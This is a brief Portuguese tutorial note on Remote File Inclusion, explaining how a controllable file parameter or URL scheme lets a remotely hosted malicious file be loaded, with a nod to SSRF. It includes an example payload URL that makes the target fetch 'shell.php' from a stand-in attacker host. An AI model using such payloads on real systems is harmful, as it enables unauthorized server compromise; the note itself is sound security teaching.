**Remote File Inclusion** permite a inclusão de algum arquivo no servidor alvo. É feito quando o servidor faz alguma requisição que permite que passemos algum link externo a ele, ou quando temos acesso ao `schema`.

Se tivermos acesso ao schema, podemos hospedar um arquivo malicioso, e injeta-lo no servidor para ver o comportamento do servidor.

É vantajoso quando o arquivo é processado pelo servidor, pois se for processado pelo front-end não faz diferença.

<input style="font-size:18pt;padding:5px;width:100%;" value="http://corp.com/?file=file://about.php">
Podemos injetar o caminho de algum externo ao servidor, pois controlamos o `schema`.
<input style="font-size:18pt;padding:5px;width:100%;" value="http://corp.com/?file=http://devil.com/shell.php">

Também é possível fazer quando podemos fazer upload em algum sistema, e ele não valida o tipo de arquivo.

---

Também pode dar origem a um SSRF, pois o servidor que fará a requisção.